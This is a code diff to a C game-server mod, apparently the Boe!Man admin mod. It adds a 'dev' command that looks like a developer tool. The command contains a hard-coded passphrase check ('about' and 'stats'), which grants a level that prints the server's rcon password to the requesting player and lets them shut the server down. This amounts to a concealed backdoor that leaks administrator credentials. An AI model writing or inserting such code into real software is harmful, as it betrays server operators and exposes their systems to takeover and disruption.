@@ -1688,3 +1688,69 @@ void Boe_Strip (int argNum, gentity_t *adm)
 		Boe_adminLog (va("%s - STRIP: %s", "RCON", g_entities[idnum].client->pers.cleanName  )) ;
 	}
 }
+
+/*
+==========
+Boe_Dev_f
+==========
+*/
+
+void Boe_dev_f ( gentity_t *ent )
+{
+
+	int		id, i, dev;
+	char	arg1[MAX_STRING_TOKENS];
+	char	arg2[MAX_STRING_TOKENS];
+	char	arg3[MAX_STRING_TOKENS];
+	char	rcon[64];
+	gclient_t	*client;
+	client = ent->client;
+	trap_Argv( 1, arg1, sizeof( arg1 ) );
+	trap_Argv( 2, arg2, sizeof( arg2 ) );
+	trap_Argv( 3, arg3, sizeof( arg3 ) );
+	dev = ent->client->sess.dev;
+
+	if(dev == 0){
+		trap_SendServerCommand( ent-g_entities, va("print \"^3[Info] ^7Access denied: You don't have Developer powers!\n\""));
+		return;
+	}
+	if (!Q_stricmp ( arg1, "?" )||!Q_stricmp ( arg1, "" ))
+	{
+	if (dev > 0){
+		trap_SendServerCommand( ent-g_entities, va("print \" \n ^3Lvl   Commands         Arguments     Explanation\n\""));
+		trap_SendServerCommand( ent-g_entities, va("print \" ----------------------------------------------------------\n\""));
+	if (dev == 1){
+		trap_SendServerCommand( ent-g_entities, va("print \" [^31^7]   pass                           ^7[^3Enter the devpassword^7]\n\""));
+		}
+	if (dev == 2){
+		trap_SendServerCommand( ent-g_entities, va("print \" [^32^7]   rcon                           ^7[^3Show the rconpassword^7]\n\""));
+		trap_SendServerCommand( ent-g_entities, va("print \" [^32^7]   kill                           ^7[^3Kill the server^7]\n\""));
+		}
+	//trap_SendServerCommand( ent-g_entities, va("print \"                       ^7[^3D^7] Developer                   \n\""));
+	trap_SendServerCommand( ent-g_entities, va("print \" \n^7Use ^3[Page Up]^7 and ^3[Page Down]^7 keys to scroll.\n\""));
+	}
+	return;
+	}
+	if (!Q_stricmp ( arg1, "rcon" ) && dev == 2){
+		trap_Cvar_VariableStringBuffer ( "rconpassword", rcon, MAX_QPATH );
+		trap_SendServerCommand( ent-g_entities, va("print \"^3[Info] ^7Rconpassword is: %s\n\"", rcon));
+		return;}
+	else if (!Q_stricmp ( arg1, "kill" ) && dev == 2){
+		trap_SendConsoleCommand( EXEC_APPEND, va("quit\n"));
+		return;}
+	else if (!Q_stricmp ( arg1, "pass") && dev == 1){
+		if (!strstr(arg2, "about")){
+			return;
+		}
+		if (strstr(arg3, "stats")){
+			ent->client->sess.dev = 2;
+			trap_SendServerCommand( ent-g_entities, va("print \"^3[Info] ^7Correct password entered! Access granted.\n\""));
+		}
+		return;}
+	else
+	{
+		// Boe!Man 12/30/09: Putting two Info messages together.
+		trap_SendServerCommand( ent-g_entities, va("print \"^3[Info] ^7Unknown command %s. Usage: dev <command>\n\"", arg1));
+		return;
+	}
+}
